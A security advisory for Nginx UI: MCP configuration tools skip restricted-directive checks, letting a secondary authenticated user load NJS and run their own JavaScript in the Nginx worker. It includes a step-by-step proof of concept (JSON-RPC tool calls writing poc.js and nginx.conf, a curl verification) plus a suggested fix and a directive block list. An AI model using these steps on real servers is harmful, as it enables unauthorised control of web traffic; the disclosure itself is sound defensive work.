summary: Nginx UI: MCP configuration tools bypass restricted directive validation and allow secondary authenticated users to execute NJS in Nginx worker context
details:
## Summary

The regular HTTP configuration API rejects restricted Nginx directives such as `load_module`, `js_import`, and `js_content`.

However, the MCP configuration interface allows a secondary authenticated user to write and apply equivalent restricted configuration content. In the lab, this allowed the user to load `ngx_http_js_module.so`, import attacker-controlled JavaScript, reload Nginx, and execute NJS in the Nginx worker context.

This is authenticated and is not OS command execution by itself.

## Affected component

- `/mcp`
- `/mcp_message`
- MCP tool: `nginx_config_add`
- Nginx configuration validation

## Impact

A secondary authenticated user can bypass the restricted directive validation enforced by the HTTP API and execute attacker-controlled NJS inside the Nginx worker context.

This may allow modification of Nginx runtime behavior, including responses, routing, headers, redirects, and request handling.

## Minimal PoC

### Preconditions

- Attacker has a secondary authenticated Nginx UI account.
- MCP is enabled.
- Nginx has NJS available:

```bash
find / -name "ngx_http_js_module.so" 2>/dev/null
```

Observed in the lab:

```text
/usr/lib/nginx/modules/ngx_http_js_module.so
```

### 1. HTTP API blocks the restricted config

Request:

```http
POST /api/configs
Authorization: <SECONDARY_USER_JWT>
Content-Type: application/json
```

Body:

```json
{
 "name": "nginx.conf",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "load_module modules/ngx_http_js_module.so;\n\nuser nginx;\nworker_processes auto;\n\nevents { worker_connections 1024; }\n\nhttp {\n js_import poc from /etc/nginx/poc.js;\n server {\n listen 127.0.0.1:18249;\n location /__poc { js_content poc.handler; }\n }\n}\n"
}
```

Observed result:

```text
Rejected because the content contains restricted directives such as load_module/js_import/js_content.
```

### 2. MCP writes the JavaScript file

Open an MCP session and call `tools/call` with:

```json
{
 "jsonrpc": "2.0",
 "id": 1,
 "method": "tools/call",
 "params": {
 "name": "nginx_config_add",
 "arguments": {
 "name": "poc.js",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "function handler(r) { r.return(200, \"MCP_NJS_MARKER\\n\"); }\nexport default { handler };\n"
 }
 }
}
```

### 3. MCP writes the NJS-enabled nginx.conf

Call `tools/call` again:

```json
{
 "jsonrpc": "2.0",
 "id": 2,
 "method": "tools/call",
 "params": {
 "name": "nginx_config_add",
 "arguments": {
 "name": "nginx.conf",
 "base_dir": "",
 "overwrite": true,
 "sync_node_ids": [],
 "content": "load_module modules/ngx_http_js_module.so;\n\nuser nginx;\nworker_processes auto;\n\nerror_log /var/log/nginx/error.log notice;\npid /run/nginx.pid;\n\nevents { worker_connections 1024; }\n\nhttp {\n default_type application/octet-stream;\n js_import poc from /etc/nginx/poc.js;\n server {\n listen 127.0.0.1:18249;\n location /__poc { js_content poc.handler; }\n }\n}\n"
 }
 }
}
```

### 4. Verify NJS execution

Inside the Nginx UI container:

```bash
curl -i http://127.0.0.1:18249/__poc
```

Observed response:

```http
HTTP/1.1 200 OK

MCP_NJS_MARKER
```

This confirms that content rejected by the HTTP API can be applied through MCP and executed as NJS in the Nginx worker context.

## Expected behavior

MCP configuration tools should enforce the same restricted directive validation as the HTTP API.

## Suggested fix

Apply `ValidateConfigFile(path, content)` before MCP configuration writes and ensure HTTP API and MCP share the same validation tests for restricted directives such as:

- `load_module`
- `js_import`
- `js_content`
- `js_set`
- `perl_set`
- `user root`
